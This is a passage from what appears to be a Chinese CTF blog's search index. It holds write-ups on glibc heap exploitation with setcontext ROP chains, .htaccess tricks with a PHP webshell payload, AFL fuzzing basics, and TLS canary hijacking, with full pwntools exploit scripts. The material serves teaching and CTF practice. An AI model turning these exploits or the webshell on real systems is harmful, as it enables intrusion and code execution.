&#x27;)heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))heap_base = heap_addr-0x1920print(&quot;heap_base=&gt;&quot;, hex(heap_base))edit(p64(heap_base+0x10))create(0x78)create(0x78)payload = b&#x27;a&#x27;*0x70+p64(0)edit(payload)delete()show()r.recvuntil(b&#x27;Content: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))__free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]puts_addr = libc_base+libc.symbols[&#x27;puts&#x27;]setcontext_addr = libc_base+libc.symbols[&#x27;setcontext&#x27;]+53syscall_addr = libc_base+next(libc.search(asm(&#x27;syscall\\nret&#x27;)))pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))pop_rax = libc_base+next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))ret_addr = libc_base+next(libc.search(asm(&#x27;ret&#x27;)))payload = b&#x27;\\x02&#x27;+b&#x27;\\x00&#x27;*4+b&#x27;\\x02&#x27;*2+b&#x27;\\x00&#x27;*4+b&#x27;\\x03&#x27;+b&#x27;\\x00&#x27;+b&#x27;\\x02&#x27;payload = payload.ljust(0x40, b&#x27;\\x00&#x27;)+p64(heap_base+0x400)payload = payload.ljust(0x68, b&#x27;\\x00&#x27;)+p64(heap_base+0x1130+0x10) + \\    p64(heap_base+0x1560+0x10)edit(payload)create(0x10)edit(b&#x27;./flag\\x00\\x00&#x27;)flag_addr = heap_base+0x400bss = libc_base+libc.bss()+0x100rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(pop_rax) + \\    p64(constants.SYS_open)+p64(syscall_addr)rop_chain += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(pop_rdx) + \\    p64(0x30)+p64(read_addr)rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)create(0x78)delete()edit(p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]))create(0x78)edit(rop_chain)rop_addr = heap_base+0x1560+0x10create(0x68)delete()edit(p64(heap_base+0x10c0+0x10))create(0x68)edit(b&#x27;\\x00&#x27;*0x30+p64(rop_addr)+p64(ret_addr))create(0x78)edit(p64(setcontext_addr))create(0x68)delete()r.interactive()\n\nGlibc2.29以上0x00007f37b1e420dd &lt;+61&gt;:\tmov    rsp,QWORD PTR [rdx+0xa0]0x00007f37b1e420e4 &lt;+68&gt;:\tmov    rbx,QWORD PTR [rdx+0x80]0x00007f37b1e420eb &lt;+75&gt;:\tmov    rbp,QWORD PTR [rdx+0x78]0x00007f37b1e420ef &lt;+79&gt;:\tmov    r12,QWORD PTR [rdx+0x48]0x00007f37b1e420f3 &lt;+83&gt;:\tmov    r13,QWORD PTR [rdx+0x50]0x00007f37b1e420f7 &lt;+87&gt;:\tmov    r14,QWORD PTR [rdx+0x58]0x00007f37b1e420fb &lt;+91&gt;:\tmov    r15,QWORD PTR [rdx+0x60]\t... ...0x00007f37b1e421c6 &lt;+294&gt;:\tmov    rcx,QWORD PTR [rdx+0xa8]0x00007f37b1e421cd &lt;+301&gt;:\tpush   rcx0x00007f37b1e421ce &lt;+302&gt;:\tmov    rsi,QWORD PTR [rdx+0x70]0x00007f37b1e421d2 &lt;+306&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]0x00007f37b1e421d6 &lt;+310&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]0x00007f37b1e421dd &lt;+317&gt;:\tmov    r8,QWORD PTR [rdx+0x28]0x00007f37b1e421e1 &lt;+321&gt;:\tmov    r9,QWORD PTR [rdx+0x30]0x00007f37b1e421e5 &lt;+325&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]0x00007f37b1e421ec &lt;+332&gt;:\txor    eax,eax0x00007f37b1e421ee &lt;+334&gt;:\tret\n\n可以看到在glibc2.29以上的版本是以rdx作为索引的，这时我们就需要一个gadget可以操作rdx了getkeyserv_handle\n0x00007f3ddba96930 &lt;+576&gt;:\tmov    rdx,QWORD PTR [rdi+0x8]0x00007f3ddba96934 &lt;+580&gt;:\tmov    QWORD PTR [rsp],rax0x00007f3ddba96938 &lt;+584&gt;:\tcall   QWORD PTR [rdx+0x20]\n\n所以此时我们就可以根据rdi继续操作rdx实现栈劫持\n2021DASCTF 3月ParentSimulator题目的流程很是很简单，结构很清晰可以分析出来\nint sub_196B()&#123;  __int64 v0; // rax  int v2; // [rsp+Ch] [rbp-4h]  puts(&quot;Please input index?&quot;);  LODWORD(v0) = input_int();  v2 = v0;  if ( v0 &lt;= 9 )  &#123;    v0 = chunk_arr[v0];    if ( v0 )    &#123;      free(chunk_arr[v2]);      chunk_inuse[v2] = 0;      LODWORD(v0) = puts(&quot;Done&quot;);    &#125;  &#125;  return v0;&#125;\n\n在delete时没有检测chunk_inuse就直接free了\nint sub_1AB0()&#123;  char *v0; // rax  int v2; // [rsp+8h] [rbp-8h]  int v3; // [rsp+Ch] [rbp-4h]  printf(&quot;You only have 1 chances to change your child&#x27;s gender, left: %d\\n&quot;, dword_4010);  LODWORD(v0) = dword_4010;  if ( dword_4010 )  &#123;    puts(&quot;Please input index?&quot;);    LODWORD(v0) = input_int();    v2 = v0;    if ( v0 &lt;= 9 )    &#123;      v0 = chunk_arr[v0];      if ( v0 )      &#123;        --dword_4010;        printf(&quot;Current gender:%s\\n&quot;, (chunk_arr[v2] + 8LL));        puts(&quot;Please rechoose your child&#x27;s gender.\\n1.Boy\\n2.Girl:&quot;);        v3 = input_int();        if ( v3 == 1 )        &#123;          v0 = (chunk_arr[v2] + 8LL);          *v0 = 7958370;        &#125;        else if ( v3 == 2 )        &#123;          v0 = (chunk_arr[v2] + 8LL);          strcpy(v0, &quot;girl&quot;);        &#125;        else        &#123;          LODWORD(v0) = puts(&quot;oho, you choose a invalid gender.&quot;);        &#125;      &#125;    &#125;  &#125;  return v0;&#125;\n\n并且在改变性别时也是没有检测chunk_inuse，而且改变性别的位置正好是bk指针，所以可以实现tcache double free\n解法1：\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &#x27;amd64&#x27;def menu(option):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.send(bytes(str(option), encoding=&#x27;utf8&#x27;)+b&#x27;\\n&#x27;)def create(idx, gender, name):    menu(1)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;2.Girl:&quot;)    r.send(bytes(str(gender), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;Please input your child&#x27;s name:&quot;)    r.send(name)def change_name(idx, name):    menu(2)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;Please input your child&#x27;s new name:&quot;)    r.send(name)def show(idx):    menu(3)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))def delete(idx):    menu(4)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, description):    menu(5)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;description:&quot;)    r.send(description)def change_gender(idx, gender):    menu(666)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;2.Girl:&quot;)    r.send(bytes(str(gender), encoding=&#x27;utf8&#x27;))context.log_level = &#x27;debug&#x27;create(0, 1, b&#x27;cml&#x27;)delete(0)change_gender(0, 2)delete(0)create(0, 1, b&#x27;cml&#x27;)create(1, 1, b&#x27;cml&#x27;)create(2, 1, b&#x27;cml&#x27;)delete(1)delete(2)show(0)r.recvuntil(b&#x27;Gender: &#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(&quot;heap_base=&gt;&quot;, hex(heap_base))create(1, 1, b&#x27;cml&#x27;)create(2, 1, b&#x27;cml&#x27;)delete(1)delete(2)change_name(0, p64(heap_base+0x10)[:-1])create(1, 1, b&#x27;cml&#x27;)create(2, 2, b&#x27;\\x00&#x27;*7)edit(2, b&#x27;\\x00&#x27;*14+b&#x27;\\x08&#x27;)delete(1)show(0)r.recvuntil(b&#x27;Gender: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))setcontext_addr = libc_base+libc.symbols[&#x27;setcontext&#x27;]+61free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]puts_addr = libc_base+libc.symbols[&#x27;puts&#x27;]pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx_r12 = libc_base+0x000000000011c371ret_addr = libc_base+next(libc.search(asm(&#x27;ret&#x27;)))gadget = libc_base+0x1546f0+576&#x27;&#x27;&#x27;   0x00007f3ddba96930 &lt;+576&gt;:\tmov    rdx,QWORD PTR [rdi+0x8]   0x00007f3ddba96934 &lt;+580&gt;:\tmov    QWORD PTR [rsp],rax   0x00007f3ddba96938 &lt;+584&gt;:\tcall   QWORD PTR [rdx+0x20]&#x27;&#x27;&#x27;bss = libc_base+libc.bss()+0x300flag_addr = heap_base+0x4c0rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(open_addr)rop_chain += p64(pop_rdi)+p64(4)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)edit(2, b&#x27;\\x00&#x27;*15)create(1, 1, b&#x27;aaaaaaa&#x27;)create(3, 1, b&#x27;flag\\x00\\x00\\x00&#x27;)edit(3, rop_chain)print(hex(puts_addr))rop_chain_addr = heap_base+0x4d0create(4, 1, b&#x27;aaaaaaa&#x27;)arg_addr = heap_base+0x5e0payload = b&#x27;\\x00&#x27;*14+b&#x27;\\x01&#x27;payload = payload.ljust(0xe8, b&#x27;\\x00&#x27;)+p64(arg_addr)edit(2, payload[:-1])create(5, 1, b&#x27;shell&#x27;)payload = p64(0)+p64(arg_addr)payload = payload.ljust(0x20, b&#x27;\\x00&#x27;)+p64(setcontext_addr)payload = payload.ljust(0xa0, b&#x27;\\x00&#x27;) + \\    p64(rop_chain_addr)+p64(setcontext_addr+334-61)edit(4, payload)payload = b&#x27;\\x00&#x27;*14+b&#x27;\\x01&#x27;payload = payload.ljust(0xe8, b&#x27;\\x00&#x27;)+p64(free_hook)edit(2, payload[:-1])create(6, 1, p64(gadget)[:-1])delete(5)r.interactive()\n\n解法2：\n在我的这篇文章中，讲了另一个方式劫持栈，也就是通过environ泄漏栈地址，计算与main函数ret时的栈地址的偏移量进行劫持，这里主要是讲解gadget就不在赘述\n","categories":["pwn"],"tags":["堆利用技巧","tcache double free"]},{"title":"关于.htaccess的技巧记录","url":"/2021/10/30/%E5%85%B3%E4%BA%8E-htaccess%E7%9A%84%E6%8A%80%E5%B7%A7%E8%AE%B0%E5%BD%95/","content":"百度词条.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。\n相关的基础概念.htaccess当中的注释，#是单行注释，并且\\可以拼接两行\n作用范围：.htaccess作用于当前目录和他的所有子目录\n在使用.htaccess的时候需要apache配置文件中ALLowOverride All当然还可以重命名AccessFileName .config\n.htaccess指令SetHandler强制所有匹配文件被指定处理器处理\nAddType application/x-httpd-php .gifSetHandler handler-name|None\n\n在CTF常用用法：\nSethandler application/x-httpd-php\n\n那么当前目录下以及子目录的所有文件都会被当作php执行\nAddType将指定的文件尾缀映射到制定内容的类型\nAddType media-type extensive [extensive] ...\n\nCTF的常用用法：\nAddType application/x-httpd-php .gif\n\n此时会将.gif的文件当作php被执行\nphp_value当使用 PHP 作为 Apache 模块时，可以用 Apache 的配置文件（例如 httpd.conf）或 .htaccess 文件中的指令来修改 PHP 的配置设定。但是需要有开启 AllowOverride Options 或 AllowOverride All 权限才可以。\nphp_value 指令用来设定指定的 PHP 的配置值。要清除先前设定的值，把 value 设为 none。但是 php_value 不能用来设定布尔值，如果要设定布尔值的话应该用 php_flag。\nphp_value name value\n\n\n在php官网有能够在.htaccess设定的内容，所以只有PHP_INI_PREDIR和PHP_INI_ALL才能被.htaccess设定\n在CTF中常用\nphp_value auto_prepend_file image.png\n\n在访问一个php文件会在访问之前包含image.png文件\nphp_flag用来设定bool类型的配置项\nphp_flag name on|off\n\nCTF常用\nphp_flag engine 0\n\n造成源码泄漏\n例题[羊城杯 2020]easy php题目源码index.php:\n&lt;?php$files = scandir(&#x27;./&#x27;);foreach ($files as $file) &#123;    if (is_file($file)) &#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;if (!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;    highlight_file(__FILE__);    die();&#125;$content = $_GET[&#x27;content&#x27;];if (stristr($content, &#x27;on&#x27;) || stristr($content, &#x27;html&#x27;) || stristr($content, &#x27;type&#x27;) || stristr($content, &#x27;flag&#x27;) || stristr($content, &#x27;upload&#x27;) || stristr($content, &#x27;file&#x27;)) &#123;    echo &quot;Hacker&quot;;    die();&#125;$filename = $_GET[&#x27;filename&#x27;];if (preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;    echo &quot;Hacker&quot;;    die();&#125;$files = scandir(&#x27;./&#x27;);foreach ($files as $file) &#123;    if (is_file($file)) &#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($filename, $content . &quot;\\nHello, world&quot;);\n\n在访问文件的时候会先把当前文件夹下的所有文件都删除了，然后可以上传content和filename，但是当你上传一个一句话木马的时候会发现这个文件没法解析，所以考虑使用.htaccess文件\n直接写出payload\nphp_value auto_prepend_fil\\ e .htaccess #&lt;?php system($_POST[1]);die();?&gt;\\ \n\n\n\n","categories":["web"],"tags":[".htaccess"]},{"title":"FUZZ(1):初探AFL","url":"/2023/03/18/%E5%88%9D%E6%8E%A2AFL/","content":"前言本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。\nAFL-FUZZ介绍AFL则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。当然配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。\n白盒下的FUZZ#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln(char *str)&#123;    int len = strlen(str);    if(str[0] == &#x27;A&#x27; &amp;&amp; len == 66)    &#123;        raise(SIGSEGV);        //如果输入的字符串的首字符为A并且长度为66，则异常退出    &#125;    else if(str[0] == &#x27;F&#x27; &amp;&amp; len == 6)    &#123;        raise(SIGSEGV);        //如果输入的字符串的首字符为F并且长度为6，则异常退出    &#125;    else    &#123;        printf(&quot;it is good!\\n&quot;);    &#125;    return 0;&#125;int main(int argc, char *argv[])&#123;    char buf[100]=&#123;0&#125;;    gets(buf);//存在栈溢出漏洞    printf(buf);//存在格式化字符串漏洞    vuln(buf);    return 0;&#125;\n\n大概流程：\n首先是用afl-gcc编译源代码进行插桩，然后以测试文件为输入，然后启动afl-fuzz程序，将testcase作为程序的输入执行程序，afl会在这个testcase的基础上进行自动变异输入，使得程序产生crash，产生了crash就会被记录起来\n编译插桩首先是面对上面这类小文件时采取的方法就是直接进行编译\nafl-gcc -g -o test test.c\n\n但是面对编译项目时，大多会使用到Makefile。如果存在configure的话肯定是可以在里面直接进行修改，如果没有的话可以直接修改Makefile或者添加以下内容:\nCC=/path/to/afl/afl-gccCXX=/path/to/afl/afl-g++\n\n 当然面对clang或者clang++的话也是一样的。\n开始FUZZ对那些可以直接从stdin读取输入的目标程序来说，语法如下：\n./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]\n\n对从文件读取输入的目标程序来说，要用“@@”，语法如下：\n./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@\n\n而对于这里命令为:afl-fuzz -i input_dir -o output_dir ./test\n其中-i选项时输入测试文件的目录，-o选项时输出结果文件的目录。\n对于这个简单的例子，测试文件只需要随便输入点东西就行，这里选择输入hello\n一般会出现上图中的问题，解决办法就是\nsudo suecho core &gt;/proc/sys/kernel/core_pattern\n\n\n上图就是AFL的界面，上面的内容根据前面的注释基本可以猜出来一二，不过跑了十分钟只跑出了五处crash就挺离谱的，这个跑的结果与testcase和电脑性能以及运气都有一定关系。\n分析crashesid:000000,sig:06,src:000001,op:havoc,rep:128样例➜  crashes xxd id:000000,sig:06,src:000001,op:havoc,rep:128 00000000: 8001 8001 92a8 c3e4 c3c3 c3fa c3ea e4c3  ................00000010: c3c3 fac3 ea04 2310 0423 1000 1010 0000  ......#..#......00000020: 9b00 1000 009b 0100 f5f5 0423 1000 1010  ...........#....00000030: 0000 9b00 1000 009b 0100 f5f5 f5f5 f5f5  ................00000040: f5f5 f5f5 f5f5 f5f5 f5f5 00fa 0423 1000  .............#..00000050: 1000 0000 20f5 0064 1000 009b 0010 0000  .... ..d........00000060: 9b01 0001 92fa 0023 1000 1000 0003 2300  .......#......#.00000070: 6410 0000 9b15                           d.....\n\n可以猜测为栈溢出\nid:000001,sig:06,src:000001,op:havoc,rep:128样例➜  crashes xxd id:000001,sig:06,src:000001,op:havoc,rep:128 00000000: 7fb8 b7b8 207f 0001 7fb7 f9ff ffff f9ff  .... ...........00000010: ffff ff17 ffff ffff 7f7f 7fb7 f9ff ffff  ................00000020: f9ff ffff ff17 ffff ffff e0ff b8ff ffdd  ................00000030: b8b7 b8da 8008 00f9 fa00 00f9 f087 8080  ................00000040: 80ff f9ff ffff ff17 ffff ffff 7f7f 7fb7  ................00000050: f9ff ffff f9ff ffff ff17 ffff ffff ff80  ................00000060: 69b8 00d8 bdda 80b8 00d8 bdda ff7f 7fb8  i...............\n\n一样的应该也是栈溢出导致的\nid:000002,sig:11,src:000000,op:flip1,pos:1样例➜  crashes xxd id:000002,sig:11,src:000000,op:flip1,pos:1  00000000: 7425 7374                                t%st\n\n这里应该是格式化字符串漏洞引起的crash\nid:000003,sig:11,src:000000,op:havoc,rep:64样例➜  crashes xxd id:000003,sig:11,src:000000,op:havoc,rep:64 00000000: 4662 4062 4040 0000 8040 7f40 1000 4040  Fb@b@@...@.@..@@00000010: 6240 4000 7740 407f 4040 8040 403f 6565  b@@.w@@.@@.@@?ee00000020: 6565 4044 4040 3340 403f 6565 6565 4040  ee@D@@3@@?eeee@@00000030: 4040 3340 4040 4040 40                   @@3@@@@@@\n\n这里应该是以F开头且长度为6引起的crash\nid:000004,sig:11,src:000002,op:havoc,rep:8样例➜  crashes xxd id:000004,sig:11,src:000002,op:havoc,rep:8  00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA00000010: 4141 4141 1e41 4141 4141 4141 4141 4132  AAAA.AAAAAAAAAA200000020: 4141 4141 4141 1e41 4141 4141 4141 4141  AAAAAA.AAAAAAAAA00000030: 4141 4141 4141 4141 4141 4141 412a 4134  AAAAAAAAAAAAA*A400000040: 41b8                                     A.\n\n这里应该是以A开头并且长度为66引起的crash\n总结可以看到上面五个样例基本覆盖了源码中存在的漏洞。\n黑盒下的FUZZ\n  黑盒模式需要使用qemu_mode，所以最好从开始就使用源码进行编译，这里可能会出现很多问题，大多都可以在网上搜到解决办法\n\n这里直接使用以下命令进行编译。\ngcc -g ./test.c -o test\n\n开始FUZZ这里的FUZZ选项略有不同，需要加上-Q选项。\nafl-fuzz -i ./input_dir -o ./output_dir -Q ./test\n\n\n虽然可以看到这里被保存的crashes有6个，比上面的还多一个，但是看total crashes远远少于上面的。可以看出来用qemu的性能远远小于插桩的。\n这里就不再分析输出的crashes文件了。\n文件读取输入的情况首先做以下准备\n➜  input_dir mkdir file➜  input_dir cp ../../testcases/others/elf/small_exec.elf ./file➜  afl_test cp /usr/bin/readelf ./\n\n随后直接进行fuzz\n../afl-fuzz -i ./input_dir/file -o ./output_dir -Q ./readelf -a @@\n\n跑了十分钟一次crash都没有的，当然跑再久应该也是一样的，这里就不再继续跑了。\n\n参考资料:    https://xz.aliyun.com/t/4314    https://www.cjovi.icu/fuzzing/1138.html\n","categories":["FUZZ"],"tags":["AFL","FUZZ"]},{"title":"劫持TLS结构","url":"/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/","content":"TLS的简单介绍我这里就不详细说明TLS的实现了，因为太复杂了(我没看懂)。具体实现过程可以参考https://dere.press/2020/10/18/glibc-tls/\n对于TLS其实是线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。\n对于TLS的变量是每一个线程所独有的，维护canary的TCB结构的也就是tls。他会在每一个线程申请自己的空间，并且在验证时也是拿自己线程所在的作比较，我们可以通过canary的实现来观察TCB结构体的位置。\n\n很好可以理解实在fs偏移28个位置的值作为canary。\n下面是TCB结构体的定义:\ntypedef struct&#123;void *tcb;/* Pointer to the TCB.Not necessarily thethread descriptor used by libpthread.*/dtv_t *dtv;void *self;/* Pointer to the thread descriptor.*/int multiple_threads;int gscope_flag;uintptr_t sysinfo;uintptr_t stack_guard;uintptr_t pointer_guard;unsigned long int vgetcpu_cache[2];/* Bit 0: X86_FEATURE_1_IBT.Bit 1: X86_FEATURE_1_SHSTK.*/unsigned int feature_1;int __glibc_unused1;/* Reservation of some values for the TM ABI.*/void *__private_tm[4];/* GCC split stack support.*/void *__private_ss;/* The lowest address of shadow stack,*/unsigned long long int ssp_base;/* Must be kept even if it is no longer used by glibc since programs,like AddressSanitizer, depend on the size of tcbhead_t.*/__128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));void *__padding[8];&#125; tcbhead_t;\n\n也可以看到在fs:28h的位置也就是stack_guard\nQ1: HGAME enter_the_evil_pwn_land检查保护\n当时就是这道题卡住了我感觉自己好菜没资格打比赛就没打了。\n解题思路unsigned __int64 __fastcall test_thread(void *a1)&#123;  int i; // [rsp+8h] [rbp-38h]  char s[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v4; // [rsp+38h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 0xFFF; ++i )  &#123;    read(0, &amp;s[i], 1uLL);    if ( s[i] == 10 )      break;  &#125;  puts(s);  return __readfsqword(0x28u) ^ v4;&#125;\n\n题目的内容很简单，存在0x1000个字节的栈溢出，但是只有一次puts的机会。\n所以，按照以往思路覆盖canary的\\x00显然是不能够的，所以我们直接劫持TLS。\n\n可以看到canary的值是0xd491330997329e00。\n\n再看TCB结构体可以看到canary确实就在偏移为0x28的地址上。\n\n可以看到TCB结构体还正在栈上。因为我们是写入0x1000字节所以显然能到这个位置。\n\nread开始的位置距离TCB结构体的距离是0x840。\n综上得出exp:from pwn import *r = process(&#x27;./a.out&#x27;)elf = ELF(&#x27;./a.out&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rdi = 0x0000000000401363ret_addr = 0x000000000040101avuln_fun = elf.sym[&#x27;test_thread&#x27;]r.sendline(b&#x27;a&#x27;*0x20)r.recvline()fsbase = u64((b&#x27;\\x00&#x27;+r.recvuntil(b&#x27;\\n&#x27;, drop=True)).ljust(8, b&#x27;\\x00&#x27;))print(hex(fsbase))payload = b&#x27;a&#x27;*(0x30-0x8)+p64(0)*2+p64(pop_rdi) + \\    p64(puts_got)+p64(puts_plt)+p64(vuln_fun)payload = payload.ljust(0x840)+p64(fsbase)*3+p64(0)*3r.sendline(payload)r.recvuntil(b&#x27;\\n&#x27;)puts_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))libc_base = puts_addr-libc.sym[&#x27;puts&#x27;]system_addr = libc_base+libc.sym[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))gdb.attach(r)pop_rsi = libc_base + 0x0000000000027529pop_rdx_r12 = libc_base + 0x000000000011c371payload = b&#x27;a&#x27;*(0x30-0x8)+p64(0)*2+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(pop_rsi)+p64(0) + \\    p64(pop_rdx_r12)+p64(0)*2+p64(libc.sym[&#x27;execve&#x27;]+libc_base)r.sendline(payload)r.interactive()\n\nQ2: BUUCTF-PWN gyctf_2020_bfnote保护检查\n这道题目需要昨天的re2dlresolve的知识，没看过的师傅可以去看看ret2dl-resolve\n解题思路unsigned int __cdecl main()&#123;  int i; // [esp+4h] [ebp-54h]  int size; // [esp+8h] [ebp-50h]  char *v3; // [esp+Ch] [ebp-4Ch]  int v4; // [esp+14h] [ebp-44h]  char s[50]; // [esp+1Ah] [ebp-3Eh] BYREF  unsigned int v6; // [esp+4Ch] [ebp-Ch]  v6 = __readgsdword(0x14u);  start_menu();  fwrite(&quot;\\nGive your description : &quot;, 1u, 0x19u, stdout);  memset(s, 0, sizeof(s));  read_0(0, s, 0x600);                          // 栈溢出  fwrite(&quot;Give your postscript : &quot;, 1u, 0x17u, stdout);  memset(&amp;unk_804A060, 0, 0x64u);  read_0(0, &amp;unk_804A060, 0x600);  fwrite(&quot;\\nGive your notebook size : &quot;, 1u, 0x1Bu, stdout);  size = input_int();  v3 = malloc(size);  memset(v3, 0, size);  fwrite(&quot;Give your title size : &quot;, 1u, 0x17u, stdout);  v4 = input_int();  for ( i = v4; size - 0x20 &lt; i; i = input_int() )    fwrite(&quot;invalid ! please re-enter :\\n&quot;, 1u, 0x1Cu, stdout);  fwrite(&quot;\\nGive your title : &quot;, 1u, 0x13u, stdout);  read_0(0, v3, i);                             fwrite(&quot;Give your note : &quot;, 1u, 0x11u, stdout);  read(0, &amp;v3[v4 + 16], size - v4 - 16);        // 任意地址写  fwrite(&quot;\\nnow , check your notebook :\\n&quot;, 1u, 0x1Du, stdout);  fprintf(stdout, &quot;title : %s&quot;, v3);  fprintf(stdout, &quot;note : %s&quot;, &amp;v3[v4 + 16]);  return __readgsdword(0x14u) ^ v6;&#125;\n\n别人可以用tls直接查看这个地址，但是我试了几次都不行所以就用了search查找canary来查找\n\n可以看到他存放的位置其实是共享映射区域，所以他的相对偏移是固定的。所以如果我们malloc一个很大的chunk(size&gt;=0x20000)，那么系统就被迫使用mmap给我们分配，根据mmap的机制我们分配的chunk就一定在tcbhead_t地址的低地址处。再根据上面main函数的漏洞就很容易修改掉canary的值了。\n思路就是分配一个大小为0x20000的堆块到canary上面去，然后计算他们之间偏移，利用上面的任意地址写修改canary的值。但是由于题目当中的输出函数是fwrite或者fprintf。我们的ROPgadget不够，所以选择使用ret2dl-resolve。\n这道题恶心人的一点\n\n在main函数最后并不是普通的leave  retn，在最后的时候esp的值会变到ebp+var_4-4的值，所以在构造ROP的时候不能在栈上面构造。\n最终得到exp:from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 28441)# r = process(&quot;./gyctf_2020_bfnote&quot;)elf = ELF(&quot;./gyctf_2020_bfnote&quot;)libc = ELF(&#x27;../buu_libc/x86/libc-2.23.so&#x27;)bss_start = 0x0804A060gap = 0x500stack_overflow = b&#x27;a&#x27; * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4)r.recvuntil(b&#x27;Give your description : &#x27;)r.send(stack_overflow)r.recvuntil(b&#x27;Give your postscript : &#x27;)fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + \\    p32(0) + p32(0) + p32(0x12)fake_rel = p32(bss_start) + p32(0x7 + ((bss_start + gap + 0x4 *                                        4 + 0x8 + 0x8 + 0x8 - 0x080481D8) // 0x10) * 0x100)r.send(b&#x27;\\x00&#x27; * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) +       p32(0) + p32(bss_start + gap + 0x4 * 4) + b&#x27;/bin/sh\\x00&#x27; + b&#x27;system\\x00\\x00&#x27; + fake_rel + fake_sym)r.recvuntil(b&#x27;Give your 